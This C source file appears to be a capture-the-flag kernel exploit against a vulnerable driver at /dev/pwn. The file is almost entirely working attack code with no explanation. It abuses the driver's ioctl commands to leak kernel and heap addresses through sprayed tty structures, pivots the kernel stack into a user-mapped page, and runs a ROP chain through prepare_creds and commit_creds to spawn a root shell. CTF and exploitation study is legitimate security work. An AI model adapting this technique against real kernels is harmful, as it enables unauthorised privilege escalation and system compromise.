/*
 * main.c
 * Copyright (C) 2019 hzshang <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <linux/prctl.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#define ADDRESS 0xdead0000

typedef uint64_t u64;
struct io_ {
    uint64_t size;
    struct {
        uint8_t* ptr;
        uint64_t size;
    } pool[0x10];
    uint64_t idx;
};

typedef struct io_ io;
typedef struct cio_ cio;
int fd;
void add(uint64_t size,uint8_t *data){
    io x;
    x.size = 1;
    x.pool[0].ptr = data;
    x.pool[0].size = size;
    ioctl(fd,6,&x);
}
void show(uint8_t* dst,uint64_t idx,uint64_t size){
    io x;
    x.idx = idx;
    x.size = 1;
    x.pool[0].ptr = dst;
    x.pool[0].size = size;
    ioctl(fd,66,&x);
}
void edit(uint8_t *src,uint64_t idx,uint64_t size){
    io x;
    x.idx = idx;
    x.size = 1;
    x.pool[0].ptr = src;
    x.pool[0].size = size;
    ioctl(fd,666,&x);
}
void dele(uint64_t idx){
    uint64_t x = idx;
    ioctl(fd,6666,&x);
}
void print_buf(u64* buf,int length){
    for(int i = 0;i<length-1;i+=2){
        printf("0x%02x:0x%016lx\t0x%016lx\n",8*i,buf[i],buf[i+1]);
    }
    if(length%2)
        printf("0x%02x:0x%016lx\n",length-1,buf[length-1]);
}
#define SIZE 0x3f0
uint64_t kernel_base = 0;
uint64_t heap_base = 0;
uint64_t (*prepare_creds)(int);
void (*commits_creds)(uint64_t);
void shell(){
    printf("real shll");
    system("sh");
}
extern void* set_reg;
extern void* swap;
extern void* loop_me;
asm(
    "set_reg:\n"
    "mov %rax,%rdi\n"
    "ret\n"
    "swap:\n"
    "swapgs\n"
    "iretq\n"
    "loop_me:\n"
    "jmp loop_me\n"
        );
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;

void save_status(){
    puts("[*] status saving");
    __asm__("mov %%cs, %0\n"
            "mov %%ss,%1\n"
            "mov %%rsp,%2\n"
            "pushfq\n"
            "pop %3\n"
            "mov %%gs,%4\n"
            "mov %%es,%5\n"
            "mov %%fs,%6\n"
            "mov %%ds,%7\n"
            ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
            "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
            );
    puts("[*]status has been saved.");
}
void foo(){
    system("sh");
}
int main(int argc, char *argv[]){
    for(int i = 1; i <=31 ; i++){
       signal(i,foo);
    }

    save_status();
    fd = open("/dev/pwn",0);
    uint64_t buf[SIZE/8];
    uint64_t reset_stack;
    memset(buf,'x',SIZE);
    for(int i=0;i<0x4;i++)
        add(SIZE,buf);
    for(int i=0;i<0x4;i++)
        edit(0xdeadbeef,i,SIZE);
    printf("done!\n");

    int ptmx_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    int idx,pid;
    for(idx=0;idx<8;idx++){
        show(buf,idx,sizeof(buf));
        if(buf[0] == 0x0000000100005401){
            printf("find victim:%d\n",idx);
            kernel_base = buf[3]-0x10a3700;
            heap_base = buf[7]-0x38;
            printf("base:%lx\n",kernel_base);
            printf("heap:%lx\n",heap_base);
            goto fuck;
            break;
        }
    }
    exit(0);
fuck:
    close(ptmx_fd);
    for(int i=0;i<0x4;i++){
        add(8,buf);
    }
    for(int i=4;i<0x8;i++){
        edit(0xdeadbeef,i,8);
    }
    for(int i=8;i<0x10;i++){
        add(0x130,buf);
    }

    uint64_t xchg_eax = 0x52180+kernel_base;
    buf[0] = xchg_eax;
    for(int i=4;i<8;i++){
        edit(buf,i,8);
    }
    uint64_t* lower = xchg_eax&0xffffffff;
    uint64_t* base = mmap(((uint32_t)lower&(~0xfff)) - 0x5000,0x10000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,-1,0);
    printf("0x%lx\n",base);
    printf("0x%lx\n",lower);
    memset(base,0xcc,0x10000);
    prepare_creds= kernel_base + 0xb9db0;
    commits_creds = kernel_base + 0xb9a00;
    uint64_t pop_rdi = kernel_base + 0x8C6553;
    uint64_t set_cr4 = kernel_base + 0x707F0;
    uint64_t swapgs_pop = kernel_base + 0x70894;
    uint64_t iretq = kernel_base + 0xa1270;
    uint64_t mov_rdi_rax = kernel_base + 0x10526;
    uint64_t pop_rax = kernel_base + 0x694e24;
    uint64_t rop[] = {
        pop_rdi,
        0,
        prepare_creds,
        commits_creds,
        swapgs_pop,
        1,
        iretq,
        &shell,
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    };
    memcpy(lower,rop,sizeof(rop));
    getchar();
    dele(8);
    
    return 0;
}



